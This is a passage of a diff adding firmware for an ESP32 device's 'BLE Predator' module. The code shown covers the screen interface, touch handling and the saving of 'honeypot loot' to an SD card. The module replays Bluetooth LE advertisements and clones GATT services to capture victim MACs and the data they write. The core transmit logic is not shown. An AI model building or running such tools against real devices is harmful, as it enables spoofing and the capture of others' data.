+    delay(10);
+
+    if (!SD.begin(SD_CS, SPI, 4000000)) {
+        SPI.end();
+        delay(50);
+        SPI.begin(18, 19, 23);
+        if (!SD.begin(SD_CS, SPI, 4000000)) {
+            hpSetStatus("SD card not found!", 0xF800);
+            SD.end();
+            return;
+        }
+    }
+
+    if (!SD.exists("/loot")) {
+        SD.mkdir("/loot");
+    }
+
+    // Build filename
+    char fname[48];
+    snprintf(fname, sizeof(fname), "/loot/ble_hp_%lu.txt", millis());
+
+    File f = SD.open(fname, FILE_WRITE);
+    if (!f) {
+        hpSetStatus("File write failed!", 0xF800);
+        SD.end();
+        return;
+    }
+
+    // Write header
+    f.println("========================================");
+    f.println("  BLE PREDATOR — HONEYPOT LOOT");
+    f.println("  HaleHound Edition");
+    f.println("========================================");
+    f.println();
+
+    int realIdx = bpFilteredToReal(S->detailIdx);
+    if (realIdx >= 0) {
+        ReconDevice* target = &S->devices[realIdx];
+        char macStr[18];
+        bpMacToStr(target->mac, macStr, sizeof(macStr));
+        f.printf("Target: %s (%s)\n", macStr, target->hasName ? target->name : "unknown");
+    }
+    f.printf("Services: %d, Characteristics: %d\n", S->hpSvcCount, S->hpCharCount);
+    f.printf("Connections: %d, Loot entries: %d\n", S->hpConnCount, S->hpLootCount);
+    f.println();
+
+    // Write service table
+    f.println("--- GATT TABLE ---");
+    for (int s = 0; s < S->hpSvcCount; s++) {
+        HpServiceInfo* si = &S->hpSvcs[s];
+        if (si->uuid16 != 0) {
+            const char* sn = lookupServiceName(si->uuid16);
+            f.printf("Service 0x%04X (%s)\n", si->uuid16, sn ? sn : "Custom");
+        } else {
+            f.printf("Service %02X%02X%02X%02X...\n",
+                     si->uuid128[12], si->uuid128[13], si->uuid128[14], si->uuid128[15]);
+        }
+        for (int c = si->charStart; c < si->charStart + si->charCount; c++) {
+            HpCharInfo* ci = &S->hpChars[c];
+            char props[8];
+            int pi = 0;
+            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ)    props[pi++] = 'R';
+            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE)   props[pi++] = 'W';
+            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE_NR) props[pi++] = 'w';
+            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_NOTIFY)  props[pi++] = 'N';
+            if (ci->properties & ESP_GATT_CHAR_PROP_BIT_INDICATE) props[pi++] = 'I';
+            props[pi] = '\0';
+            if (ci->uuid16 != 0) {
+                f.printf("  Char 0x%04X [%s]\n", ci->uuid16, props);
+            } else {
+                f.printf("  Char %02X%02X..%02X%02X [%s]\n",
+                         ci->uuid128[12], ci->uuid128[13], ci->uuid128[14], ci->uuid128[15], props);
+            }
+        }
+    }
+    f.println();
+
+    // Write events
+    f.println("--- EVENTS ---");
+    int totalEntries = (S->hpLootCount > HP_MAX_LOOT) ? HP_MAX_LOOT : S->hpLootCount;
+    for (int i = 0; i < totalEntries; i++) {
+        int ringIdx = i;
+        if (S->hpLootCount > HP_MAX_LOOT) {
+            ringIdx = (S->hpLootCount - HP_MAX_LOOT + i) % HP_MAX_LOOT;
+        }
+        HpLootEntry* e = &S->hpLoot[ringIdx];
+
+        switch (e->type) {
+            case HP_EVT_CONNECT:
+                f.printf("[%08lu] CONNECT victim=%02X:%02X:%02X:%02X:%02X:%02X\n",
+                         e->timestamp,
+                         e->victimMAC[0], e->victimMAC[1], e->victimMAC[2],
+                         e->victimMAC[3], e->victimMAC[4], e->victimMAC[5]);
+                break;
+            case HP_EVT_DISCONNECT:
+                f.printf("[%08lu] DISCONNECT\n", e->timestamp);
+                break;
+            case HP_EVT_READ:
+                f.printf("[%08lu] READ   char=0x%04X\n", e->timestamp, e->charHandle);
+                break;
+            case HP_EVT_WRITE: {
+                f.printf("[%08lu] WRITE  char=0x%04X len=%d data=",
+                         e->timestamp, e->charHandle, e->dataLen);
+                for (int b = 0; b < e->dataLen; b++) {
+                    f.printf("%02X", e->data[b]);
+                }
+                // ASCII representation
+                f.print(" ascii=\"");
+                for (int b = 0; b < e->dataLen; b++) {
+                    char c = (char)e->data[b];
+                    f.print((c >= 0x20 && c < 0x7F) ? c : '.');
+                }
+                f.println("\"");
+                break;
+            }
+        }
+    }
+    f.println();
+    f.println("========================================");
+
+    f.close();
+    SD.end();
+
+    // Confirmation via status banner (persists 3 seconds)
+    char statusBuf[32];
+    snprintf(statusBuf, sizeof(statusBuf), "SAVED: %s", fname + 6);  // Skip "/loot/"
+    hpSetStatus(statusBuf, 0x07E0);  // Green
+}
+
+static void handleHoneypotTouch() {
+    uint16_t tx, ty;
+    bool touching = getTouchPoint(&tx, &ty);
+
+    if (bpWaitForRelease) {
+        if (!touching) bpWaitForRelease = false;
+        return;
+    }
+    if (!touching) return;
+    if (millis() - S->lastIconTap < 350) return;
+    S->lastIconTap = millis();
+    bpWaitForRelease = true;
+
+    // Icon bar back → stop honeypot
+    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM + 4) {
+        stopHoneypot();
+        return;
+    }
+
+    // Bottom buttons: STOP / SAVE / CLEAR (match drawHoneypotStatic layout)
+    int btnW = SCALE_W(65);
+    int btnH = SCALE_H(26);
+    int btnY = SCREEN_HEIGHT - SCALE_H(32);
+    int stopX  = SCALE_X(5);
+    int saveX  = SCALE_X(80);
+    int clearX = SCALE_X(160);
+
+    if (ty >= btnY && ty <= btnY + btnH) {
+        // STOP
+        if (tx >= stopX && tx <= stopX + btnW) {
+            stopHoneypot();
+            return;
+        }
+        // SAVE
+        if (tx >= saveX && tx <= saveX + btnW) {
+            hpSetStatus("Saving to SD...", HALEHOUND_MAGENTA);
+            hpSaveLootToSD();
+            return;
+        }
+        // CLEAR
+        if (tx >= clearX && tx <= clearX + btnW) {
+            S->hpLootCount = 0;
+            S->hpLootScroll = 0;
+            S->hpConnCount = 0;
+            memset(S->hpLoot, 0, sizeof(S->hpLoot));
+            hpSetStatus("Loot cleared", HALEHOUND_VIOLET);
+            return;
+        }
+    }
+
+    // Scroll loot: upper half = scroll up, lower half = scroll down
+    int bannerBottom = SCALE_Y(92) + SCALE_H(18) + SCALE_H(14) + 2;
+    int btnTop = SCREEN_HEIGHT - SCALE_H(34);
+    if (ty >= bannerBottom && ty < btnTop) {
+        int mid = (bannerBottom + btnTop) / 2;
+        if (ty < mid) {
+            if (S->hpLootScroll < S->hpLootCount) S->hpLootScroll++;
+        } else {
+            if (S->hpLootScroll > 0) S->hpLootScroll--;
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING — ICON BAR
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void drawIconBar() {
+    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
+    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
+
+    // Back (always)
+    tft.drawBitmap(SCALE_X(10), ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
+
+    if (S->phase == PHASE_LISTEN) {
+        // Pause/Resume
+        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16,
+                       S->scanning ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
+        // Filter left
+        tft.drawBitmap(SCALE_X(100), ICON_BAR_Y, bitmap_icon_LEFT, 16, 16, HALEHOUND_MAGENTA);
+        // Filter right
+        tft.drawBitmap(SCALE_X(135), ICON_BAR_Y, bitmap_icon_RIGHT, 16, 16, HALEHOUND_MAGENTA);
+        // Speed
+        tft.drawBitmap(SCALE_X(175), ICON_BAR_Y, bitmap_icon_signal, 16, 16, HALEHOUND_VIOLET);
+        // BLE indicator
+        tft.drawBitmap(SCALE_X(215), ICON_BAR_Y, bitmap_icon_ble, 16, 16,
+                       S->scanning ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
+    } else if (S->phase == PHASE_TARGET) {
+        // Only back icon — handled above
+    } else if (S->phase == PHASE_ATTACK) {
+        // Stop
+        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16, HALEHOUND_HOTPINK);
+        // Speed cycle
+        tft.drawBitmap(SCALE_X(100), ICON_BAR_Y, bitmap_icon_signal, 16, 16, HALEHOUND_VIOLET);
+    } else if (S->phase == PHASE_RECON) {
+        // Only back icon during RECON (abort)
+    } else if (S->phase == PHASE_HONEYPOT) {
+        // Stop icon
+        tft.drawBitmap(SCALE_X(55), ICON_BAR_Y, bitmap_icon_start, 16, 16, HALEHOUND_HOTPINK);
+    }
+
+    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING — PHASE 1: LISTEN
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void drawHeader() {
+    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(20), HALEHOUND_BLACK);
+    drawGlitchText(SCALE_Y(55), "PREDATOR", &Nosifer_Regular10pt7b);
+
+    tft.setFreeFont(NULL);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, SCALE_Y(42));
+    int filtered = bpCountFiltered();
+    tft.printf("%d/%d", filtered, S->deviceCount);
+    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(195), SCALE_Y(42));
+    tft.print(pfNames[S->filter]);
+}
+
+static void drawColumnHeaders() {
+    tft.fillRect(0, SCALE_Y(58), SCREEN_WIDTH, SCALE_H(14), HALEHOUND_DARK);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(SCALE_X(5), SCALE_Y(60));
+    tft.print("RSSI");
+    tft.setCursor(SCALE_X(40), SCALE_Y(60));
+    tft.print("MAC");
+    tft.setCursor(SCALE_X(110), SCALE_Y(60));
+    tft.print("TYPE");
+    tft.setCursor(SCALE_X(185), SCALE_Y(60));
+    tft.print("#");
+}
+
+static void drawDeviceList() {
+    drawHeader();
+    drawColumnHeaders();
+
+    int listY = SCALE_Y(74);
+    int listH = SCALE_Y(280) - listY;
+    tft.fillRect(0, listY, SCREEN_WIDTH, listH, HALEHOUND_BLACK);
+
+    if (S->deviceCount == 0) {
+        tft.setTextColor(HALEHOUND_GUNMETAL);
+        tft.setTextSize(1);
+        tft.setCursor(SCALE_X(30), SCALE_Y(140));
+        tft.print("Listening for devices...");
+        return;
+    }
+
+    uint32_t now = millis();
+    int y = listY;
+    int drawn = 0;
+    int skipped = 0;
+
+    for (int i = 0; i < S->deviceCount && drawn < BP_MAX_VISIBLE; i++) {
+        ReconDevice* d = &S->devices[i];
+        if (!bpPassesFilter(d)) continue;
+
+        if (skipped < S->listStartIndex) {
+            skipped++;
+            continue;
+        }
+
+        int filtPos = skipped + drawn;
+        uint32_t age = now - d->lastSeen;
+
+        // Row highlight
+        bool isCurrent = (filtPos == S->currentIndex);
+        if (isCurrent) {
+            tft.fillRect(0, y, SCREEN_WIDTH, BP_ITEM_HEIGHT - 2, HALEHOUND_DARK);
+        }
+
+        // Color coding
+        uint16_t rowColor;
+        if (isCurrent) {
+            rowColor = HALEHOUND_BRIGHT;
+        } else if (d->selected) {
+            rowColor = HALEHOUND_HOTPINK;
+        } else if (age < 5000 && d->hasName) {
+            rowColor = TFT_WHITE;
+        } else if (age < 5000) {
+            rowColor = HALEHOUND_MAGENTA;
+        } else if (d->companyId != 0xFFFF && lookupCompanyName(d->companyId) != nullptr) {
+            rowColor = HALEHOUND_VIOLET;
+        } else if (age > 30000) {
+            rowColor = HALEHOUND_GUNMETAL;
+        } else {
+            rowColor = HALEHOUND_MAGENTA;
+        }
+
+        uint16_t bgColor = isCurrent ? HALEHOUND_DARK : TFT_BLACK;
+        tft.setTextColor(rowColor, bgColor);
+        tft.setTextSize(1);
+
+        // Selection marker
+        if (d->selected) {
+            tft.setCursor(SCALE_X(1), y + SCALE_H(4));
+            tft.print(">");
+        }
+
+        // RSSI bar
+        bpDrawRssiBar(SCALE_X(5), y + 1, d->rssi);
+
+        // Short MAC (last 3 octets)
+        tft.setCursor(SCALE_X(30), y + SCALE_H(4));
+        char shortMac[10];
+        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
+                 d->mac[3], d->mac[4], d->mac[5]);
+        tft.print(shortMac);
+
+        // Type label
+        tft.setCursor(SCALE_X(85), y + SCALE_H(4));
+        tft.print(bpDevLabel(d->companyId, d->hasName));
+
+        // Frame count
+        tft.setCursor(SCALE_X(175), y + SCALE_H(4));
+        if (d->frameCount > 999) {
+            tft.printf("%dk", d->frameCount / 1000);
+        } else {
+            tft.printf("%d", d->frameCount);
+        }
+
+        // Active dot
+        if (d->frameCount > 5 && age < 10000) {
+            tft.fillCircle(SCREEN_WIDTH - SCALE_X(5), y + SCALE_H(8), 2, HALEHOUND_HOTPINK);
+        }
+
+        y += BP_ITEM_HEIGHT;
+        drawn++;
+    }
+
+    // Stats line
+    int statsY = SCALE_Y(280);
+    tft.fillRect(0, statsY, SCREEN_WIDTH, SCALE_H(14), HALEHOUND_BLACK);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, statsY + 1);
+    uint32_t elapsed = (millis() - S->scanStartTime) / 1000;
+    tft.printf("T:%d  Dwell:%dms", S->deviceCount, S->replayDwellMs);
+    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(180), statsY + 1);
+    tft.printf("%02d:%02d", (int)(elapsed / 60), (int)(elapsed % 60));
+
+    // Footer hint
+    int footY = SCALE_Y(295);
+    tft.fillRect(0, footY, SCREEN_WIDTH, SCALE_H(25), HALEHOUND_GUNMETAL);
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
+    tft.setCursor(SCALE_X(5), footY + SCALE_H(8));
+    tft.print("TAP=Target  LONG=Select");
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING — PHASE 2: TARGET (detail overlay)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void drawTargetOverlay() {
+    int realIdx = bpFilteredToReal(S->detailIdx);
+    if (realIdx < 0 || realIdx >= S->deviceCount) return;
+
+    ReconDevice* d = &S->devices[realIdx];
+
+    // Overlay box
+    int ovX = SCALE_X(5);
+    int ovY = SCALE_Y(38);
+    int ovW = SCREEN_WIDTH - SCALE_X(10);
+    int ovH = SCREEN_HEIGHT - SCALE_H(45);
+    tft.fillRect(ovX, ovY, ovW, ovH, HALEHOUND_BLACK);
+    tft.drawRect(ovX, ovY, ovW, ovH, HALEHOUND_HOTPINK);
+    tft.drawRect(ovX + 1, ovY + 1, ovW - 2, ovH - 2, HALEHOUND_VIOLET);
+
+    int y = SCALE_Y(48);
+    int lineH = SCALE_H(14);
+    int textX = SCALE_X(12);
+    tft.setTextSize(1);
+
+    // Title
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(SCALE_X(75), y);
+    tft.print(">> TARGET <<");
+    y += lineH + 2;
+
+    // Name
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.print("Name: ");
+    tft.setTextColor(TFT_WHITE);
+    tft.print(d->hasName ? d->name : "(none)");
+    y += lineH;
+
+    // Full MAC
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.print("MAC:  ");
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    char macStr[18];
+    bpMacToStr(d->mac, macStr, sizeof(macStr));
+    tft.print(macStr);
+    y += lineH;
+
+    // Address type
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.print("Type: ");
+    tft.setTextColor(HALEHOUND_BRIGHT);
+    tft.print(bpAddrTypeStr(d->addrType));
+    if (d->addrType == BLE_ADDR_TYPE_PUBLIC) {
+        tft.setTextColor(0xFD20);  // Yellow warning
+        tft.print(" MAC MOD");
+    }
+    y += lineH;
+
+    // Vendor / Company
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.print("Vendor: ");
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.print(bpDevLabel(d->companyId, d->hasName));
+    y += lineH;
+
+    // RSSI + proximity
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.print("RSSI: ");
+    tft.setTextColor(TFT_WHITE);
+    tft.printf("%d dBm", d->rssi);
+    tft.setTextColor(HALEHOUND_GUNMETAL);
+    tft.printf(" (%d/%d)", d->rssiMin, d->rssiMax);
+    tft.setTextColor(HALEHOUND_BRIGHT);
+    tft.printf(" %s", bpProximityStr(d->rssi));
+    y += lineH;
+
+    // Frame count + age
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.print("Frames: ");
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.print(d->frameCount);
+    uint32_t age = (millis() - d->firstSeen) / 1000;
+    tft.setTextColor(HALEHOUND_GUNMETAL);
+    tft.printf("  Age: %ds", age);
+    y += lineH + 4;
+
+    // Payload hex dump
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(textX, y);
+    tft.printf("Payload (%d bytes):", d->payloadLen);
+    y += lineH;
+
+    // Show payload in rows of 10 bytes
+    tft.setTextColor(HALEHOUND_VIOLET);
+    for (int row = 0; row < 4 && row * 10 < d->payloadLen; row++) {
+        tft.setCursor(textX, y);
+        int start = row * 10;
+        int end = start + 10;
+        if (end > d->payloadLen) end = d->payloadLen;
+        for (int j = start; j < end; j++) {
+            tft.printf("%02X", d->payload[j]);
+        }
+        y += lineH - 2;
+    }
+    y += 4;
+
+    // Manufacturer data
+    if (d->mfgDataLen > 0) {
+        tft.setTextColor(HALEHOUND_HOTPINK);
+        tft.setCursor(textX, y);
+        tft.print("MfgData: ");
+        tft.setTextColor(HALEHOUND_VIOLET);
+        for (int i = 0; i < d->mfgDataLen; i++) {
+            tft.printf("%02X ", d->mfgData[i]);
+        }
+        y += lineH;
+    }
+
+    // ── REPLAY / HONEYPOT / BACK buttons — pinned to bottom of overlay ──
+    int btnW = SCALE_W(60);
+    int btnH = SCALE_H(24);
+    int btnY = SCREEN_HEIGHT - SCALE_H(40);
+    int replayX  = SCALE_X(5);
+    int hpotX    = SCALE_X(80);
+    int backX    = SCALE_X(160);
+
+    // Save for touch detection
+    S->targetBtnY = btnY;
+
+    bool canAttack = ::isOffensiveAllowed() && d->payloadLen > 0;
+    uint16_t atkColor = canAttack ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
+
+    // REPLAY button — same behavior as old ATTACK
+    tft.fillRect(replayX, btnY, btnW, btnH, HALEHOUND_DARK);
+    tft.drawRect(replayX, btnY, btnW, btnH, atkColor);
+    tft.setTextColor(atkColor);
+    tft.setCursor(replayX + SCALE_X(6), btnY + SCALE_H(7));
+    tft.print("REPLAY");
+
+    // HONEYPOT button — GATT clone attack
+    uint16_t hpColor = canAttack ? HALEHOUND_VIOLET : HALEHOUND_GUNMETAL;
+    tft.fillRect(hpotX, btnY, btnW + SCALE_W(10), btnH, HALEHOUND_DARK);
+    tft.drawRect(hpotX, btnY, btnW + SCALE_W(10), btnH, hpColor);
+    tft.setTextColor(hpColor);
+    tft.setCursor(hpotX + SCALE_X(4), btnY + SCALE_H(7));
+    tft.print("HONEYPOT");
+
+    // BACK button
+    tft.fillRect(backX, btnY, btnW, btnH, HALEHOUND_DARK);
+    tft.drawRect(backX, btnY, btnW, btnH, HALEHOUND_MAGENTA);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(backX + SCALE_X(10), btnY + SCALE_H(7));
+    tft.print("BACK");
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING — PHASE 3: ATTACK
+// ═══════════════════════════════════════════════════════════════════════════
+
+// PROGMEM skull icon table
+static const unsigned char* const bpSkulls[BP_SKULL_NUM] PROGMEM = {
+    bitmap_icon_skull_wifi,
+    bitmap_icon_skull_bluetooth,
+    bitmap_icon_skull_jammer,
+    bitmap_icon_skull_subghz,
+    bitmap_icon_skull_ir,
+    bitmap_icon_skull_tools,
+    bitmap_icon_skull_setting,
+    bitmap_icon_skull_about
+};
+
+static void drawAttackView() {
+    int y = SCALE_Y(42);
+    tft.setTextSize(1);
+
+    // Title
+    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(20), HALEHOUND_BLACK);
+    drawGlitchText(SCALE_Y(55), "PREDATOR", &Nosifer_Regular10pt7b);
+
+    // Status
+    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(65), SCALE_Y(42));
+    tft.print(">> ATTACKING <<");
+
+    y = SCALE_Y(66);
+
+    // Find first selected target for display
+    int selIdx = -1;
+    for (int i = 0; i < S->deviceCount; i++) {
+        if (S->devices[i].selected) { selIdx = i; break; }
+    }
+    if (selIdx < 0) return;
+
+    ReconDevice& t = S->devices[selIdx];
+
+    // Target info
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, y);
+    tft.print("MAC: ");
+    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
+    char macStr[18];
+    bpMacToStr(t.mac, macStr, sizeof(macStr));
+    tft.print(macStr);
+    y += 14;
+
+    // Payload preview
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, y);
+    tft.print("PLD: ");
+    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
+    int showBytes = t.payloadLen > 8 ? 8 : t.payloadLen;
+    for (int i = 0; i < showBytes; i++) {
+        tft.printf("%02X", t.payload[i]);
+    }
+    if (t.payloadLen > 8) tft.print("...");
+    y += 14;
+
+    // Type + mode
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, y);
+    tft.print("TYP: ");
+    tft.setTextColor(HALEHOUND_BRIGHT, HALEHOUND_BLACK);
+    tft.print(bpDevLabel(t.companyId, t.hasName));
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.print("  MODE: ");
+    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
+    tft.print(S->replayMode == RM_SINGLE ? "SINGLE" : "ROTATE");
+    y += 14;
+
+    // Dwell
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, y);
+    tft.printf("DWELL: %dms", S->replayDwellMs);
+
+    S->staticDrawn = true;
+}
+
+static void drawDynamicAttack() {
+    if (!S->staticDrawn) drawAttackView();
+    if (!S->replaying) return;
+
+    // TX counter
+    char buf[36];
+    snprintf(buf, sizeof(buf), "[+] TX: %-8lu (%d/s)  ", S->replayCount, S->replayRate);
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(5, SCALE_Y(130));
+    tft.print(buf);
+}
+
+static void drawSkulls() {
+    int skullStartX = 10;
+    int skullSpacing = (SCREEN_WIDTH - 20) / BP_SKULL_NUM;
+    int frame = (int)(millis() / 120);
+
+    for (int i = 0; i < BP_SKULL_NUM; i++) {
+        int x = skullStartX + (i * skullSpacing);
+        tft.fillRect(x, BP_SKULL_Y, 16, 16, TFT_BLACK);
+
+        uint16_t color;
+        if (S->replaying) {
+            int phase = (frame + i) % 8;
+            if (phase < 4) {
+                color = bpGradientColor(phase / 3.0f);
+            } else {
+                float ratio = (phase - 4) / 3.0f;
+                uint8_t r = 255 - (uint8_t)(ratio * 255);
+                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
+                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
+                color = tft.color565(r, g, b);
+            }
+        } else {
+            color = HALEHOUND_GUNMETAL;
+        }
+
+        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&bpSkulls[i]);
+        tft.drawBitmap(x, BP_SKULL_Y, icon, 16, 16, color);
+    }
+
+    int labelX = skullStartX + (BP_SKULL_NUM * skullSpacing) + 5;
+    tft.fillRect(labelX - 5, BP_SKULL_Y, 50, 16, TFT_BLACK);
+    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setTextSize(1);
+    tft.setCursor(labelX, BP_SKULL_Y + 4);
+    tft.print(S->replaying ? "TX!" : "OFF");
+}
+
+static void drawCounterBar() {
+    tft.fillRect(0, BP_BAR_Y, SCREEN_WIDTH, 25, TFT_BLACK);
+
+    int barX = 10;
+    int barY = BP_BAR_Y + 2;
+    int barW = SCALE_W(140);
+    int barH = 10;
+
+    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
+    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);
+
+    // Fill proportional to rate
+    float maxRate = 1000.0f / S->replayDwellMs;
+    float fillPct = (S->replayRate > 0) ? (float)S->replayRate / maxRate : 0.0f;
+    if (fillPct > 1.0f) fillPct = 1.0f;
+    int fillW = (int)(fillPct * barW);
+    if (fillW > 0) {
+        for (int px = 0; px < fillW; px++) {
+            float ratio = (float)px / (float)barW;
+            uint16_t c = bpGradientColor(ratio);
+            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
+        }
+    }
+
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+    char cntBuf[12];
+    snprintf(cntBuf, sizeof(cntBuf), "%lu", S->replayCount);
+    tft.setCursor(barX + 4, barY + 1);
+    tft.print(cntBuf);
+
+    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setCursor(SCALE_X(160), BP_BAR_Y + 3);
+    tft.printf("%d rep/s", S->replayRate);
+
+    if (S->replaying) {
+        tft.drawBitmap(SCALE_X(220), BP_BAR_Y + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// TOUCH HANDLING
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void handleListenTouch() {
+    uint16_t tx, ty;
+    bool touching = getTouchPoint(&tx, &ty);
+
+    if (bpWaitForRelease) {
+        if (!touching) bpWaitForRelease = false;
+        return;
+    }
+    if (!touching) return;
+    if (millis() - S->lastIconTap < 350) return;
+    S->lastIconTap = millis();
+
+    // ── Icon bar ──────────────────────────────────────────────────────────
+    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM + 4) {
+        bpWaitForRelease = true;
+
+        // Back
+        if (tx >= SCALE_X(5) && tx < SCALE_X(35)) {
+            S->exitRequested = true;
+            return;
+        }
+        // Scan toggle
+        if (tx >= SCALE_X(45) && tx < SCALE_X(75)) {
+            if (S->scanning) {
+                S->scanning = false;
+                if (S->pScan) S->pScan->stop();
+            } else {
+                S->scanning = true;
+                if (S->pScan) S->pScan->start(5, bpScanComplete, false);
+            }
+            drawIconBar();
+            return;
+        }
+        // Filter left
+        if (tx >= SCALE_X(90) && tx < SCALE_X(120)) {
+            S->filter = (PredFilter)((S->filter + PF_COUNT - 1) % PF_COUNT);
+            S->listStartIndex = 0;
+            S->currentIndex = 0;
+            drawDeviceList();
+            return;
+        }
+        // Filter right
+        if (tx >= SCALE_X(125) && tx < SCALE_X(155)) {
+            S->filter = (PredFilter)((S->filter + 1) % PF_COUNT);
+            S->listStartIndex = 0;
+            S->currentIndex = 0;
+            drawDeviceList();
+            return;
+        }
+        // Speed (dwell cycle)
+        if (tx >= SCALE_X(165) && tx < SCALE_X(195)) {
+            S->dwellIndex = (S->dwellIndex + 1) % BP_DWELL_COUNT;
+            S->replayDwellMs = dwellPresets[S->dwellIndex];
+            drawDeviceList();  // Refresh stats line showing dwell
+            return;
+        }
+        return;
+    }
+
+    // ── Device list area ──────────────────────────────────────────────────
+    int listTopY = SCALE_Y(74);
+    int listBotY = SCALE_Y(280);
+    if (ty >= listTopY && ty < listBotY && S->deviceCount > 0) {
+        int tappedRow = (ty - listTopY) / BP_ITEM_HEIGHT;
+        int newIdx = S->listStartIndex + tappedRow;
+        int filtered = bpCountFiltered();
+        if (newIdx >= filtered) return;
+
+        bpWaitForRelease = true;
+
+        // Double-tap detection for multi-select (long press simulation)
+        static unsigned long lastListTap = 0;
+        static int lastTapIdx = -1;
+        unsigned long now = millis();
+
+        if (lastTapIdx == newIdx && now - lastListTap < 600) {
+            // Double-tap on same item → toggle selection
+            int realIdx = bpFilteredToReal(newIdx);
+            if (realIdx >= 0) {
+                S->devices[realIdx].selected = !S->devices[realIdx].selected;
+                S->currentIndex = newIdx;
+                drawDeviceList();
+            }
+            lastTapIdx = -1;
+        } else {
+            // Single tap → go to TARGET detail
+            S->currentIndex = newIdx;
+            S->detailIdx = newIdx;
+            S->phase = PHASE_TARGET;
+            tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, TFT_BLACK);
+            drawIconBar();
+            drawTargetOverlay();
+        }
+
+        lastListTap = now;
+        lastTapIdx = newIdx;
+        return;
+    }
+
+    // ── Footer area (scroll pages) ────────────────────────────────────────
+    if (ty >= SCALE_Y(295)) {
+        bpWaitForRelease = true;
